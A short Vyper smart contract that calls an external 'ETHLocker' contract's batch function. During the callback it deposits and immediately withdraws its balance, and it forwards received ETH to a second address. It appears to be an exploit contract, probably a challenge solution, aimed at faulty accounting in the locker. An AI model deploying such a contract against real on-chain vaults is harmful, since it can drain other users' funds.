#pragma evm-version cancun

interface ETHLocker:
    def batch(): nonpayable
    def deposit(): payable
    def withdraw(receiver : address, amount : int256) : nonpayable
    def transfer(receiver : address, amount : int256) : nonpayable

other : immutable(address)
eth_locker : immutable(address)

@payable
@external
def __init__(_eth_locker : address, _other : address):
    other = _other
    eth_locker = _eth_locker

@payable
@external
def run():
    ETHLocker(eth_locker).batch()

@external
def callback():
    amount : int256 = convert(self.balance, int256)
    ETHLocker(eth_locker).deposit(value=self.balance)
    ETHLocker(eth_locker).withdraw(self, amount)

@payable
@external
def __default__():
    ETHLocker(eth_locker).transfer(other, convert(msg.value, int256))